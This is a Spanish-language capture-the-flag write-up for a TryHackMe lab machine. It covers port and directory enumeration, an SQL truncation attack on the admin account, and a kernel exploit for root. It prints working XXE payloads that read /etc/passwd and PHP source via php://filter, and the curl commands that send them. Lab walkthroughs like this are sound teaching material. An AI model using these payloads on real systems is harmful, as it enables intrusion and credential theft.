# CTF TryHackme Baterry
![Screenshot from 2021-02-21 20-32-32](/assets/Screenshot%20from%202021-02-21%2020-32-32.png)


## Escaneando puertos 
Escaneo basico de puertos
**nmap -T5 -n -sV -F -v -oN nmap.init 10.10.70.121**
```
# Nmap 7.91 scan initiated Sun Feb 21 22:27:25 2021 as: nmap -T5 -n -sV -F -v -oN nmap.init 10.10.70.121
Nmap scan report for 10.10.70.121
Host is up (0.18s latency).
Not shown: 98 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 21 22:27:35 2021 -- 1 IP address (1 host up) scanned in 10.20 seconds
```

Enumerando los directorios:

Se utilizo la heramienta dirbuster y el reporte obtenido fue: 

```
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Sun Feb 21 22:55:04 VET 2021
--------------------------------

http://10.10.70.121:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/scripts/
/scripts/ie/
/admin.php/

Dirs found with a 403 response:

/.hta/
/.htaccess/
/.htpasswd/
/scripts/.hta/
/scripts/.htaccess/
/scripts/.htpasswd/
/icons/
/scripts/ie/.hta/
/scripts/ie/.htaccess/
/scripts/ie/.htpasswd/
/icons/.hta/
/icons/.htaccess/
/icons/.htpasswd/
/server-status/
/icons/small/
/icons/small/.htpasswd/
/icons/small/.hta/
/icons/small/.htaccess/


--------------------------------
Files found during testing:

Files found with a 403 responce:

/.htaccess.php
/.hta.php
/.htpasswd.php
/.hta
/.htaccess
/.htpasswd
/scripts/.hta.php
/scripts/.htaccess.php
/scripts/.htpasswd.php
/scripts/.hta
/scripts/.htaccess
/scripts/.htpasswd
/scripts/ie/.hta
/scripts/ie/.htaccess
/scripts/ie/.htpasswd
/scripts/ie/.hta.php
/icons/.hta
/icons/.htaccess
/scripts/ie/.htaccess.php
/icons/.htpasswd
/scripts/ie/.htpasswd.php
/icons/.htaccess.php
/icons/.hta.php
/icons/.htpasswd.php
/server-status
/icons/small/.hta.php
/icons/small/.hta
/icons/small/.htaccess
/icons/small/.htaccess.php
/icons/small/.htpasswd
/icons/small/.htpasswd.php

Files found with a 200 responce:

/acc.php
/admin.php
/forms.php
/register.php
/scripts/jquery.min.js
/scripts/jquery-mobilemenu.min.js
/scripts/jquery.1.9.0.min.js
/index.html
/scripts/ie/index.html
/report
/icons/README

Files found with a 302 responce:

/dashboard.php
/depo.php
/with.php
/tra.php
/logout.php

Files found with a 301 responce:

/scripts/ie
/scripts
/icons/small


--------------------------------
```


La página interesane fue **/admin.php** y **/report**

- /report tenia un binario con posibles nombres de usuario.

![Screenshot from 2021-02-21 21-54-28](/assets/Screenshot%20from%202021-02-21%2021-54-28.png)


- /admin.php tiene un formaulario de registro 


### Explotación

SQL trucation atack.

Con este se obtivieron las credenciales de la cuenta **admin@bank.a** con lo cual logramos entrar a las partes de admin del sistema.


Encontramos una peticion con xml en la página forms.php 

![Screenshot from 2021-02-21 22-56-08](/assets/Screenshot%20from%202021-02-21%2022-56-08.png)

Enviando intentando hacer un **XXE** en la página: forms.php

**$curl -H "Content-Type: text/xml" -d @req.xml --cookie "PHPSESSID=jtqp2u2llg197f1daork8mda76" -X POST http://10.10.70.121/forms.php**

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE data [
<!ELEMENT root ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<root> 
<name>2</name> 
<search>&file;</search> 
</root>
```

Obteniendo los contenidos de los archivos .php del sitio

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE data [
<!ELEMENT root ANY>
<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=acc.php">
]>
<root> 
<name>2</name> 
<search>&file;</search> 
</root>
```


En el archivo **acc.php** encontramos una credencial del usuario cyber.


```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE data [
<!ELEMENT root ANY>
<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=acc.php">
]>
<root> 
<name>2</name> 
<search>&file;</search> 
</root>
```

```bash
curl -H "Content-Type: text/xml" -d @req.xml --cookie "PHPSESSID=td59le73l18krlmepvtt8kojv5" -X POST http://10.10.232.244/forms.php
```
Resultado de la ejecución fue:
![Screenshot from 2021-02-22 22-09-07](/assets/Screenshot%20from%202021-02-22%2022-09-07.png)


Decodificando el base64
![Screenshot from 2021-02-22 22-11-33](/assets/Screenshot%20from%202021-02-22%2022-11-33.png)

Obtenemos la credencial

![Selection_010](/assets/Selection_010.png)


### Escalamiento de privilegios 

Realizando una inspeccion básica se encontro lo siguiente:
- Permisos de root en el ejecutable run.py
![Screenshot from 2021-02-22 22-16-35](/assets/Screenshot%20from%202021-02-22%2022-16-35.png)
- Kernel muy viejo con explotación directa
![Screenshot from 2021-02-22 22-17-23](/assets/Screenshot%20from%202021-02-22%2022-17-23.png)

## Explotando el kernel 3.13.0-32

Compilando el exploit y obteniendo la shell de super usuario.
![Screenshot from 2021-02-22 22-19-41](/assets/Screenshot%20from%202021-02-22%2022-19-41.png)

Maquina rooteada =).










